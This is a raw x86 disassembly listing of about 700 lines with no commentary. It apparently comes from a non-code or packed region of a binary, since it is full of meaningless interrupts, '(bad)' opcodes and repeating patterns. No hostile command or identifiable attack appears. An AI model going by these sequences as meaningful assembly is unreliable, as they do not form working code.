  423b7f:	push   ebp
  423b80:	int    0x8d
  423b82:	push   ebp
  423b83:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b86:	or     al,0xd3
  423b88:	lods   eax,DWORD PTR ds:[esi]
  423b89:	sub    bl,dl
  423b8b:	jmp    0x423b1f
  423b8d:	push   ebx
  423b8e:	ror    DWORD PTR [edx],cl
  423b90:	jbe    0x423b9f
  423b92:	leave  
  423b93:	jbe    0x423b2a
  423b95:	dec    eax
  423b96:	and    DWORD PTR [esi-0x528936cb],eax
  423b9c:	ret    0x8621
  423b9f:	xor    eax,0xcd5576cd
  423ba4:	lea    edx,[ebp+0x3b]
  423ba7:	jns    0x423be4
  423ba9:	or     al,0xd3
  423bab:	jmp    0x423b3f
  423bad:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bb3:	lea    ebx,ds:0x52f7d43
  423bb9:	push   ss
  423bba:	xchg   DWORD PTR [eax-0x6d241480],eax
  423bc0:	add    BYTE PTR [eax-0x326a7233],0x76
  423bc7:	xchg   ebp,eax
  423bc8:	int    0x96
  423bca:	inc    ebp
  423bcb:	cmp    eax,ebp
  423bcd:	cmp    ecx,DWORD PTR [edi]
  423bcf:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bd5:	push   ebx
  423bd6:	jge    0x423ba5
  423bd8:	jbe    0x423bf7
  423bda:	xor    edx,edx
  423bdc:	cmp    ebx,edx
  423bde:	clc    
  423bdf:	add    cl,BYTE PTR [edx]
  423be1:	jbe    0x423bf0
  423be3:	int    0x76
  423be5:	lods   eax,DWORD PTR ds:[esi]
  423be6:	int    0x8d
  423be8:	lods   eax,DWORD PTR ds:[esi]
  423be9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bec:	or     al,0xd3
  423bee:	jmp    0x423b82
  423bf0:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bf6:	lea    ecx,ds:0x16d87d43
  423bfc:	int    0x76
  423bfe:	lods   eax,DWORD PTR ds:[esi]
  423bff:	int    0x8d
  423c01:	lods   eax,DWORD PTR ds:[esi]
  423c02:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c05:	or     al,0xd3
  423c07:	lods   eax,DWORD PTR ds:[esi]
  423c08:	sub    bl,dl
  423c0a:	jmp    0x423b9e
  423c0c:	push   ebx
  423c0d:	ror    DWORD PTR [edx],cl
  423c0f:	jbe    0x423c1e
  423c11:	int    0x76
  423c13:	xchg   ebp,eax
  423c14:	int    0x8d
  423c16:	xchg   ebp,eax
  423c17:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c1a:	or     al,0xd3
  423c1c:	lods   eax,DWORD PTR ds:[esi]
  423c1d:	sub    bl,dl
  423c1f:	jmp    0x423bb3
  423c21:	push   ebx
  423c22:	ror    ebp,cl
  423c24:	lea    ecx,ds:0xad3d12f
  423c2a:	jbe    0x423c39
  423c2c:	int    0x76
  423c2e:	push   ebp
  423c2f:	int    0x8d
  423c31:	push   ebp
  423c32:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c35:	or     al,0xd3
  423c37:	jmp    0x423bcb
  423c39:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c3f:	lea    ecx,ds:0x52f7d43
  423c45:	pusha  
  423c46:	xchg   edx,eax
  423c47:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c4e:	or     eax,0x874576cd
  423c53:	jbe    0x423c25
  423c55:	or     ah,dh
  423c57:	cmp    eax,0x5d5d760a
  423c5c:	inc    ecx
  423c5d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c63:	leave  
  423c64:	jbe    0x423ccb
  423c66:	cmp    DWORD PTR [ecx],esp
  423c68:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c6e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c74:	int    0x76
  423c76:	cmp    eax,0x3b3d8dcd
  423c7b:	jns    0x423cb8
  423c7d:	or     al,0xd3
  423c7f:	lods   eax,DWORD PTR ds:[esi]
  423c80:	sub    bl,dl
  423c82:	jmp    0x423c16
  423c84:	push   ebx
  423c85:	ror    DWORD PTR [edx],cl
  423c87:	jbe    0x423d06
  423c89:	int    0x6d
  423c8b:	jmp    0x423c93
  423c8d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423c97:	add    BYTE PTR [ebx],cl
  423c99:	and    DWORD PTR [esi-0x369232cb],eax
  423c9f:	push   es
  423ca0:	jl     0x423ca2
  423ca2:	add    BYTE PTR [eax],al
  423ca4:	mul    DWORD PTR [ecx]
  423ca6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423cac:	int    0x76
  423cae:	icebp  
  423caf:	int    0x8d
  423cb1:	icebp  
  423cb2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cb5:	or     al,0xd3
  423cb7:	lods   eax,DWORD PTR ds:[esi]
  423cb8:	sub    bl,dl
  423cba:	jmp    0x423c4e
  423cbc:	push   ebx
  423cbd:	ror    ebp,cl
  423cbf:	lea    edi,[ebp+0x2f]
  423cc2:	rcl    ebx,1
  423cc4:	int    0x8d
  423cc6:	pop    ebp
  423cc7:	retf   0x8884
  423cca:	or     DWORD PTR [esi-0x1f],esi
  423ccd:	int    0x6d
  423ccf:	int    0x76
  423cd1:	icebp  
  423cd2:	int    0x8d
  423cd4:	icebp  
  423cd5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cd8:	jns    0x423cad
  423cda:	jmp    0x423c6e
  423cdc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423ce2:	lea    edi,[ebp+0x2f]
  423ce5:	rcl    ebx,1
  423ce7:	int    0x8d
  423ce9:	gs int 0x96
  423cec:	cmp    ecx,DWORD PTR gs:[edi]
  423cef:	cmp    edx,ebp
  423cf1:	shl    edx,cl
  423cf3:	sub    bl,dl
  423cf5:	repz xchg edx,eax
  423cf7:	push   ebx
  423cf8:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423cfe:	das    
  423cff:	pop    ecx
  423d00:	dec    esp
  423d01:	mov    ch,cl
  423d03:	push   es
  423d04:	mov    WORD PTR [eax],es
  423d06:	add    BYTE PTR [eax],al
  423d08:	int    0x17
  423d0a:	mov    WORD PTR [eax],es
  423d0c:	add    BYTE PTR [eax],al
  423d0e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d11:	aad    0xd3
  423d13:	lods   eax,DWORD PTR ds:[esi]
  423d14:	sub    bl,dl
  423d16:	repz xchg edx,eax
  423d18:	push   ebx
  423d19:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d1f:	loope  0x423d5c
  423d21:	jge    0x423d2c
  423d23:	(bad)  
  423d24:	loope  0x423cf3
  423d26:	ins    DWORD PTR es:[edi],dx
  423d27:	retf   0xe176
  423d2a:	int    0x8d
  423d2c:	icebp  
  423d2d:	int    0x96
  423d2f:	icebp  
  423d30:	cmp    ecx,DWORD PTR [edi]
  423d32:	cmp    edx,ebp
  423d34:	shl    ebx,cl
  423d36:	xchg   edx,eax
  423d37:	shl    edx,cl
  423d39:	sub    BYTE PTR [ebx+0x13],dl
  423d3c:	int    0x96
  423d3e:	jge    0x423d6f
  423d40:	rcl    DWORD PTR [ebx],1
  423d42:	int    0x96
  423d44:	pop    ebp
  423d45:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d4c:	icebp  
  423d4d:	int    0x8d
  423d4f:	icebp  
  423d50:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d53:	or     al,0xd3
  423d55:	lods   eax,DWORD PTR ds:[esi]
  423d56:	sub    bl,dl
  423d58:	jmp    0x423cec
  423d5a:	push   ebx
  423d5b:	ror    ebp,cl
  423d5d:	lea    edi,[ebp+0x2f]
  423d60:	rcl    ebx,1
  423d62:	int    0x8d
  423d64:	pop    ebp
  423d65:	retf   0x8884
  423d68:	or     DWORD PTR [esi-0x1f],esi
  423d6b:	int    0x6d
  423d6d:	int    0x76
  423d6f:	icebp  
  423d70:	int    0x8d
  423d72:	icebp  
  423d73:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d76:	lods   eax,DWORD PTR ds:[esi]
  423d77:	sub    BYTE PTR [ebx],bh
  423d79:	or     al,0xd3
  423d7b:	jmp    0x423d0f
  423d7d:	push   ebx
  423d7e:	ror    ebp,cl
  423d80:	lea    edi,[ebp+0x2f]
  423d83:	rcl    ebx,1
  423d85:	int    0x8d
  423d87:	ins    DWORD PTR es:[edi],dx
  423d88:	int    0x96
  423d8a:	ins    DWORD PTR es:[edi],dx
  423d8b:	cmp    ecx,DWORD PTR [edi]
  423d8d:	cmp    edx,ebp
  423d8f:	shl    edx,cl
  423d91:	sub    bl,dl
  423d93:	repz xchg edx,eax
  423d95:	push   ebx
  423d96:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d9c:	das    
  423d9d:	pop    ecx
  423d9e:	dec    esp
  423d9f:	mov    ch,cl
  423da1:	push   es
  423da2:	jl     0x423da4
  423da4:	add    BYTE PTR [eax],al
  423da6:	int    0x17
  423da8:	jl     0x423daa
  423daa:	add    BYTE PTR [eax],al
  423dac:	cmp    edi,DWORD PTR [ecx+0x3b]
  423daf:	aad    0xd3
  423db1:	lods   eax,DWORD PTR ds:[esi]
  423db2:	sub    bl,dl
  423db4:	repz xchg edx,eax
  423db6:	push   ebx
  423db7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423dbd:	loope  0x423dfa
  423dbf:	jge    0x423dca
  423dc1:	(bad)  
  423dc2:	loope  0x423d91
  423dc4:	ins    DWORD PTR es:[edi],dx
  423dc5:	retf   0xe176
  423dc8:	int    0x8d
  423dca:	icebp  
  423dcb:	int    0x96
  423dcd:	icebp  
  423dce:	cmp    ecx,DWORD PTR [edi]
  423dd0:	cmp    edx,ebp
  423dd2:	shl    ebx,cl
  423dd4:	xchg   edx,eax
  423dd5:	shl    edx,cl
  423dd7:	sub    BYTE PTR [ebx+0x13],dl
  423dda:	int    0x96
  423ddc:	jge    0x423e0d
  423dde:	rcl    DWORD PTR [ebx],1
  423de0:	int    0x96
  423de2:	pop    ebp
  423de3:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dea:	and    eax,0x3b258dcd
  423def:	or     al,0x3b
  423df1:	jns    0x423dc6
  423df3:	jmp    0x423d87
  423df5:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423dfb:	lea    ebp,[ebp-0x33]
  423dfe:	xchg   esi,eax
  423dff:	ins    DWORD PTR es:[edi],dx
  423e00:	cmp    ecx,DWORD PTR [edi]
  423e02:	cmp    edx,ebp
  423e04:	shl    edx,cl
  423e06:	sub    bl,dl
  423e08:	repz xchg edx,eax
  423e0a:	push   ebx
  423e0b:	adc    ebp,DWORD PTR [edi]
  423e0d:	rcl    ebx,1
  423e0f:	xchg   DWORD PTR [esi+0x7d],esi
  423e12:	or     dh,BYTE PTR [esi+0x7d]
  423e15:	int    0x76
  423e17:	jge    0x423de6
  423e19:	lea    ecx,ds:0xb2f7d43
  423e1f:	(bad)  
  423e20:	inc    DWORD PTR [eax]
  423e22:	add    ch,cl
  423e24:	jbe    0x423e93
  423e26:	int    0x8d
  423e28:	ins    DWORD PTR es:[edi],dx
  423e29:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e2c:	jmp    0x423dc0
  423e2e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e31:	lods   eax,DWORD PTR ds:[esi]
  423e32:	sub    BYTE PTR [ebx-0x2d],dl
  423e35:	int    0x8d
  423e37:	or     eax,0xcdd3d12f
  423e3c:	lea    edi,ds:0xf2d30f3b
  423e42:	sub    BYTE PTR [ebx-0x2d],dl
  423e45:	int    0x8d
  423e47:	cmp    eax,0xebd30c3b
  423e4c:	xchg   edx,eax
  423e4d:	push   ebx
  423e4e:	ror    DWORD PTR [edx],cl
  423e50:	jbe    0x423eb7
  423e52:	int    0x76
  423e54:	popf   
  423e55:	int    0x8d
  423e57:	popf   
  423e58:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e5b:	jmp    0x423def
  423e5d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e60:	lods   eax,DWORD PTR ds:[esi]
  423e61:	sub    BYTE PTR [ebx-0x2d],dl
  423e64:	int    0x8d
  423e66:	popf   
  423e67:	int    0x96
  423e69:	popf   
  423e6a:	cmp    ecx,DWORD PTR [edi]
  423e6c:	shl    edx,cl
  423e6e:	sub    BYTE PTR [ebx],bh
  423e70:	aad    0xd3
  423e72:	repz xchg edx,eax
  423e74:	push   ebx
  423e75:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e7b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423e81:	in     al,dx
  423e82:	sbb    al,0xcd
  423e84:	jbe    0x423e23
  423e86:	int    0x8d
  423e88:	popf   
  423e89:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e8c:	or     al,0xd3
  423e8e:	lods   eax,DWORD PTR ds:[esi]
  423e8f:	sub    bl,dl
  423e91:	jmp    0x423e25
  423e93:	push   ebx
  423e94:	rol    DWORD PTR [edi+0x760a4576],cl
  423e9a:	inc    ebp
  423e9b:	int    0x76
  423e9d:	popf   
  423e9e:	int    0x8d
  423ea0:	popf   
  423ea1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ea4:	lods   eax,DWORD PTR ds:[esi]
  423ea5:	sub    BYTE PTR [ebx],bh
  423ea7:	or     al,0xd3
  423ea9:	jmp    0x423e3d
  423eab:	push   ebx
  423eac:	ror    ebp,cl
  423eae:	lea    ebx,ds:0x76cd7d33
  423eb4:	popf   
  423eb5:	int    0x96
  423eb7:	popf   
  423eb8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ebb:	aad    0xd3
  423ebd:	repz xchg edx,eax
  423ebf:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ec5:	xchg   esi,eax
  423ec6:	inc    ebp
  423ec7:	das    
  423ec8:	rcl    edx,1
  423eca:	inc    ebx
  423ecb:	shr    DWORD PTR [edi],cl
  423ecd:	pop    es
  423ece:	adc    ebp,edi
  423ed0:	add    BYTE PTR [eax],al
  423ed2:	int    0x76
  423ed4:	mov    BYTE PTR [eax],al
  423ed6:	(bad)  
  423ed7:	dec    esp
  423ed8:	iret   
  423ed9:	jbe    0x423e98
  423edb:	add    dh,dl
  423edd:	mov    BYTE PTR [eax-0x33],dh
  423ee0:	jbe    0x423e6a
  423ee2:	int    0x1
  423ee4:	xchg   ebp,eax
  423ee5:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423eef:	icebp  
  423ef0:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423efa:	jne    0x423eb9
  423efc:	test   al,0x88
  423efe:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f05:	stc    
  423f06:	int    0x8d
  423f08:	stc    
  423f09:	cmp    eax,ebp
  423f0b:	cmp    ecx,DWORD PTR [edi]
  423f0d:	shl    edx,cl
  423f0f:	sub    bl,dl
  423f11:	mov    ebp,0xcdd35392
  423f16:	lea    esi,[ebp+0x43]
  423f19:	rcl    esp,cl
  423f1b:	push   esi
  423f1c:	int    0x76
  423f1e:	mov    ch,cl
  423f20:	lea    ebp,ds:0xcd2d96cd
  423f26:	add    DWORD PTR [ecx],edx
  423f28:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f32:	shr    edx,cl
  423f34:	sub    BYTE PTR [ebx+0x13],dl
  423f37:	jno    0x423f06
  423f39:	(bad)  
  423f3a:	stc    
  423f3b:	int    0x96
  423f3d:	stc    
  423f3e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f41:	cdq    
  423f42:	shr    ebx,cl
  423f44:	xchg   edx,eax
  423f45:	shr    edx,cl
  423f47:	sub    BYTE PTR [ebx+0x13],dl
  423f4a:	jno    0x423f4c
  423f4c:	(bad)  
  423f4d:	jne    0x423f4f
  423f4f:	jo     0x423f6d
  423f51:	stos   BYTE PTR es:[edi],al
  423f52:	test   al,0x63
  423f54:	retf   
  423f55:	ror    BYTE PTR [eax-0x12326980],cl
  423f5b:	add    al,0xed
  423f5d:	and    al,0x98
  423f5f:	int    0x11
  423f61:	int    0x12
  423f63:	sub    eax,0x4808081
  423f68:	pop    esp
  423f69:	sub    BYTE PTR [edi],0x5
  423f6c:	dec    edx
  423f6d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f77:	add    BYTE PTR [esi],0xf7
  423f7a:	das    
  423f7b:	add    eax,0x80808003
  423f80:	int    0x7
  423f82:	or     DWORD PTR [eax+0x6d068080],eax
  423f88:	das    
  423f89:	add    eax,0x808080e9
  423f8e:	add    al,0x69
  423f90:	int3   
  423f91:	add    BYTE PTR [eax+0x52f3080],0xe2
  423f98:	add    BYTE PTR [eax+0x54985e80],0x2f
  423f9f:	add    eax,0x808080e3
  423fa4:	int    0xc1
  423fa6:	and    eax,0x4808081
  423fab:	mov    dh,0x11
  423fad:	or     ch,0x13
  423fb0:	xor    ecx,DWORD PTR [esi-0x79]
  423fb3:	shr    BYTE PTR [edi],cl
  423fb5:	mov    ebx,0x8d0a4c70
  423fba:	mov    ch,0x2f
  423fbc:	mov    ebx,0x13874e7c
  423fc1:	das    
  423fc2:	add    eax,0x80808049
  423fc7:	iret   
  423fc8:	jl     0x423fde
  423fca:	pop    ebx
  423fcb:	or     cl,BYTE PTR [ebp+0x69bd]
  423fd1:	add    BYTE PTR [ebx-0x2baef966],al
  423fd7:	or     ebp,0x31
  423fda:	add    al,0xb6
  423fdc:	cmc    
  423fdd:	sub    BYTE PTR [ebx],0x99
  423fe0:	xchg   ecx,esi
  423fe2:	das    
  423fe3:	mov    ebx,0xbb2f4ee0
  423fe8:	mov    al,ds:0xd4fc874c
  423fed:	mov    esi,0xa148acf
  423ff2:	(bad)  
  423ff3:	in     eax,dx
  423ff4:	push   es
  423ff5:	push   ecx
  423ff6:	aam    0x6e
  423ff8:	int    0x89
  423ffa:	add    al,0xb6
  423ffc:	stc    
  423ffd:	sub    BYTE PTR [ebx],0xf
  424000:	xchg   DWORD PTR [ebp+0x2f],edi
  424003:	mov    ebx,0xbb2f4ede
  424008:	sahf   
  424009:	dec    esp
  42400a:	xchg   esp,edi
  42400c:	aam    0x33
  42400e:	iret   
  42400f:	ficom  WORD PTR [edx+ecx*1]
  424012:	out    0xfd,al
  424014:	int    0xe6
  424016:	std    
  424017:	int    0x6a
  424019:	push   es
  42401a:	add    ah,dl
  42401c:	xchg   ch,cl
  42401e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42401f:	mov    ch,0x81
  424021:	and    al,0x8b
  424023:	das    
  424024:	mov    ebx,0xbb2f4ede
  424029:	sahf   
  42402a:	dec    esp
  42402b:	add    BYTE PTR [esi-0x7],dh
  42402e:	add    al,0x76
  424030:	std    
  424031:	mov    BYTE PTR [edi-0x619a104],al
  424037:	sbb    ch,0x2f
  42403a:	mov    ebx,0xbb2f4ee0
  42403f:	mov    al,ds:0xed8dcd4c
  424044:	add    BYTE PTR [esi-0xb],dh
  424047:	add    al,0xd3
  424049:	mov    BYTE PTR [edi-0x1272f504],al
  42404f:	pop    esi
  424050:	out    0xf5,al
  424052:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424059:	jo     0x4240a9
  42405b:	das    
  42405c:	mov    ebx,0x76004cdc
  424061:	adc    DWORD PTR [ebx+edx*8],eax
  424064:	mov    BYTE PTR [edi-0x4272f527],al
  42406a:	pop    esi
  42406b:	xchg   esi,eax
  42406c:	adc    DWORD PTR [edi],ebp
  42406e:	or     ebp,DWORD PTR [esi-0x56000000]
  424074:	arpl   WORD PTR [ebx],di
  424076:	ins    DWORD PTR es:[edi],dx
  424077:	ins    BYTE PTR es:[edi],dx
  424078:	in     al,dx
  424079:	xchg   edx,eax
  42407a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42407d:	retf   
  42407e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424084:	sub    eax,0xcd808081
  424089:	jbe    0x4240d7
  42408b:	add    al,0xed
  42408d:	xor    BYTE PTR [ebx+0x3b],bl
  424090:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424096:	add    eax,0x8080800b
  42409b:	inc    ebx
  42409c:	(bad)
  42409f:	pop    esi
  4240a0:	pushf  
  4240a1:	(bad)  
  4240a3:	test   DWORD PTR [ebx],edi
  4240a5:	ins    DWORD PTR es:[edi],dx
  4240a6:	ins    BYTE PTR es:[edi],dx
  4240a7:	in     al,dx
  4240a8:	fmul   st,st(5)
  4240aa:	ins    BYTE PTR es:[edi],dx
  4240ab:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240b1:	and    al,0xcd
  4240b3:	jo     0x4240e9
  4240b5:	int    0x90
  4240b7:	adc    al,0xcd
  4240b9:	fcomp  QWORD PTR [edi+eax*4]
  4240bc:	lea    ecx,[eax+0xa889687]
  4240c2:	(bad)  
  4240c3:	std    
  4240c4:	inc    ebx
  4240c5:	clc    
  4240c6:	jnp    0x42404f
  4240c8:	or     ah,dh
  4240ca:	std    
  4240cb:	or     ah,BYTE PTR [esi-0x259a107]
  4240d1:	fsub   st,st(3)
  4240d3:	inc    ebx
  4240d4:	pushf  
  4240d5:	adc    al,0x77
  4240d7:	xchg   BYTE PTR [edi],ch
  4240d9:	mov    ebx,0x92eca054
  4240de:	int    0xf4
  4240e0:	iret   
  4240e1:	push   esp
  4240e2:	ror    ebp,0x68
  4240e5:	push   es
  4240e6:	add    ah,dl
  4240e8:	ds xchg esi,esp
  4240eb:	mov    BYTE PTR [edx],cl
  4240ed:	out    0x11,al
  4240ef:	inc    ebx
  4240f0:	stc    
  4240f1:	fdiv   DWORD PTR [eax]
  4240f3:	int    0xa6
  4240f5:	dec    esp
  4240f6:	int    0x63
  4240f8:	in     al,0x87
  4240fa:	popf   
  4240fb:	inc    ebx
  4240fc:	cld    
  4240fd:	ja     0x424083
  4240ff:	int    0x58
  424101:	in     al,dx
  424102:	mov    BYTE PTR [ebx],dh
  424104:	out    0x88,al
  424106:	or     ch,BYTE PTR [eax-0x33]
  424109:	(bad)  
  42410a:	adc    DWORD PTR [esi],eax
  42410c:	not    esp
  42410e:	dec    esi
  42410f:	int    0xa6
  424111:	stc    
  424112:	dec    ebx
  424113:	or     ah,BYTE PTR [esi-0x259bc07]
  424119:	sbb    BYTE PTR [ebp-0x14],0x8
  42411d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424120:	test   al,0x63
  424122:	retf   
  424123:	ror    BYTE PTR [eax-0x12326980],cl
  424129:	add    al,0xed
  42412b:	push   eax
  42412c:	pop    ebx
  42412d:	cwde   
  42412e:	pop    ebp
  42412f:	dec    ecx
  424130:	and    DWORD PTR [esi-0x289f5cb],eax
  424136:	leave  
  424137:	jbe    0x424132
  424139:	inc    ecx
  42413a:	and    DWORD PTR [esi-0x27232cb],eax
  424140:	int    0xa6
  424142:	std    
  424143:	call   0x3b81:0x90cfffc0
  42414a:	psrlq  mm5,mm3
  42414d:	xchg   edx,eax
  42414e:	stos   BYTE PTR es:[edi],al
  42414f:	cmp    esp,ecx
  424151:	shl    ebp,cl
  424153:	sub    BYTE PTR [ebx+0xc],dl
  424156:	or     cl,BYTE PTR [ebp-0x2723243]
  42415c:	int    0x8d
  42415e:	std    
  42415f:	int    0x8d
  424161:	std    
  424162:	int    0x8d
  424164:	std    
  424165:	int    0x8d
  424167:	std    
  424168:	int    0x8d
  42416a:	std    
  42416b:	int    0x8d
  42416d:	std    
  42416e:	int    0x8d
  424170:	std    
  424171:	int    0x8d
  424173:	std    
  424174:	int    0x8d
  424176:	std    
  424177:	leave  
  424178:	jbe    0x42418b
  42417a:	fadd   st,st(5)
  42417c:	loope  0x4241d3
  42417e:	int    0x8d
  424180:	std    
  424181:	int    0xa6
  424183:	std    
  424184:	cmp    esp,ecx
  424186:	cmp    ecx,DWORD PTR [edi]
  424188:	shl    ebp,cl
  42418a:	sub    bl,dl
  42418c:	jmp    0x424120
  42418e:	push   ebx
  42418f:	or     al,0xcd
  424191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424192:	dec    esp
  424193:	int    0x9f
  424195:	sub    eax,0x43808081
  42419a:	push   ebx
  42419b:	das    
  42419c:	add    eax,0x80808717
  4241a1:	int    0x8d
  4241a3:	std    
  4241a4:	int    0xa6
  4241a6:	std    
  4241a7:	cmp    ecx,DWORD PTR [edi]
  4241a9:	cmp    esp,ecx
  4241ab:	shr    ebx,cl
  4241ad:	xchg   edx,eax
  4241ae:	shl    ebp,cl
  4241b0:	sub    BYTE PTR [ebx+0xc],dl
  4241b3:	inc    ebx
  4241b4:	adc    ebp,DWORD PTR [edi]
  4241b6:	add    eax,0x8080877f
  4241bb:	int    0xca
  4241bd:	add    DWORD PTR [eax-0x69327f80],eax
  4241c3:	std    
  4241c4:	int    0xa6
  4241c6:	std    
  4241c7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241cd:	xchg   edx,eax
  4241ce:	shl    ebp,cl
  4241d0:	sub    BYTE PTR [ebx-0x2b],dl
  4241d3:	inc    ebx
  4241d4:	adc    ebp,DWORD PTR [edi]
  4241d6:	add    eax,0x8080875b
  4241db:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  4241e1:	int    0xf1
  4241e3:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  4241e9:	shl    ebx,cl
  4241eb:	xchg   edx,eax
  4241ec:	shl    ebp,cl
  4241ee:	sub    BYTE PTR [ebx-0x2b],dl
  4241f1:	or     dl,BYTE PTR [esi+0x1196cd11]
  4241f7:	inc    ebx
  4241f8:	icebp  
  4241f9:	aam    0x26
  4241fb:	int    0x76
  4241fd:	std    
  4241fe:	int    0x96
  424200:	std    
  424201:	cmp    ebx,ecx
  424203:	cmp    edi,DWORD PTR [ecx-0x2d]
  424206:	jmp    0xd253:0x92bdd328
  42420d:	int    0x96
  42420f:	adc    DWORD PTR [ebx-0x26],esi
  424212:	adc    al,0x5e
  424214:	test   BYTE PTR [edx-0x2a],cl
  424217:	xor    cl,ch
  424219:	jbe    0x424218
  42421b:	int    0x96
  42421d:	std    
  42421e:	cmp    ebx,ecx
  424220:	cmp    edi,DWORD PTR [ecx-0x2d]
  424223:	jmp    0xd253:0x92bdd328
  42422a:	int    0x96
  42422c:	adc    DWORD PTR [ebx-0x26],esi
  42422f:	adc    al,0x5e
  424231:	je     0x42427d
  424233:	xor    BYTE PTR [edi],ch
  424235:	add    eax,0x808092df
  42423a:	int    0x76
  42423c:	std    
  42423d:	int    0x76
  42423f:	std    
  424240:	int    0xa6
  424242:	std    
  424243:	int    0x76
  424245:	std    
  424246:	cmp    ecx,ecx
  424248:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42424e:	in     al,dx
  42424f:	xchg   edx,eax
  424250:	push   ebx
  424251:	popf   
  424252:	int    0x76
  424254:	adc    DWORD PTR [ebx+0x6d],esi
  424257:	adc    al,0x87
  424259:	ror    ebp,cl
  42425b:	jl     0x42428d
  42425d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424263:	int    0x8d
  424265:	std    
  424266:	int    0x96
  424268:	std    
  424269:	cmp    ecx,DWORD PTR [edi]
  42426b:	cmp    ebx,ecx
  42426d:	shr    ebx,cl
  42426f:	xchg   edx,eax
  424270:	shr    edx,cl
  424272:	sub    BYTE PTR [ebx+0x13],dl
  424275:	int    0x96
  424277:	std    
  424278:	or     cl,BYTE PTR [ebp+0xa88cd95]
  42427e:	lea    esi,[ebp+0x3bfd8dcd]
  424284:	cdq    
  424285:	cmp    esi,eax
  424287:	shl    edx,cl
  424289:	sub    bl,dl
  42428b:	repz xchg edx,eax
  42428d:	push   ebx
  42428e:	jecxz  0x42425d
  424290:	lea    esi,[ebp-0x792becbd]
  424296:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42429c:	int    0x8d
  42429e:	std    
  42429f:	int    0x96
  4242a1:	std    
  4242a2:	cmp    ecx,DWORD PTR [edi]
  4242a4:	cmp    ebx,ecx
  4242a6:	shr    ebx,cl
  4242a8:	xchg   edx,eax
  4242a9:	shr    edx,cl
  4242ab:	sub    BYTE PTR [ebx+0x13],dl
  4242ae:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242b2:	jbe    0x424251
  4242b4:	popa   
  4242b5:	and    DWORD PTR [esi-0x777278cb],eax
  4242bb:	or     cl,BYTE PTR [ebp-0x32781313]
  4242c1:	(bad)  
  4242c2:	in     eax,dx
  4242c3:	int    0x76
  4242c5:	dec    esp
  4242c6:	int    0x1
  4242c8:	adc    DWORD PTR [ecx+0x718080],eax
  4242ce:	xor    ch,cl
  4242d0:	jbe    0x42431e
  4242d2:	add    dh,dl
  4242d4:	in     eax,dx
  4242d5:	int    0x1
  4242d7:	adc    DWORD PTR [ecx+0x70008080],eax
  4242dd:	dec    esp
  4242de:	leave  
  4242df:	jbe    0x424286
  4242e1:	pop    DWORD PTR [ebp*1-0x5a89368a]
  4242e8:	dec    edx
  4242e9:	pop    ss
  4242ea:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  4242f0:	xchg   esi,eax
  4242f1:	std    
  4242f2:	cmp    ecx,DWORD PTR [edi]
  4242f4:	cmp    ebx,ecx
  4242f6:	shr    ebx,cl
  4242f8:	xchg   edx,eax
  4242f9:	shr    edx,cl
  4242fb:	sub    BYTE PTR [ebx+0x13],dl
  4242fe:	or     dh,BYTE PTR [esi-0x4b]
  424301:	inc    ebx
  424302:	jge    0x4242da
  424304:	pop    eax
  424305:	int    0x76
  424307:	stc    
  424308:	int    0x8d
  42430a:	stc    
  42430b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42430e:	lock shl edx,cl
  424311:	sub    bl,dl
  424313:	mov    ebp,0xcdd35392
